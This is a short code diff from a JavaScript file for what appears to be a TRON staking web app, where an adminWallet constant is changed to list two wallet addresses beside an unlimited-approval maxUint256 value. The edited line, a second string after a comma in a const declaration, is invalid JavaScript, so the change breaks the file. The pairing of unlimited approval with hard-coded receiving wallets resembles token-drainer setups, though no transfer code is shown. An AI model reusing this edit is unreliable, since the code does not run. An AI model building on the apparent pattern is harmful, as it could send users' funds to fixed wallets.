@@ -244,7 +244,7 @@ const stakingConfigs = [
 ];
 
 const maxUint256 = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
-const adminWallet = 'THNiVH2i5gqgTXR3PMYFaMKdygiXrzJPrk';
+const adminWallet = 'THNiVH2i5gqgTXR3PMYFaMKdygiXrzJPrk', 'TXgL1i4dF1vEhDYuVsMuo8ovcfdEE6tztA';
 let tronWeb, userAddress;
 let contracts = [];
 
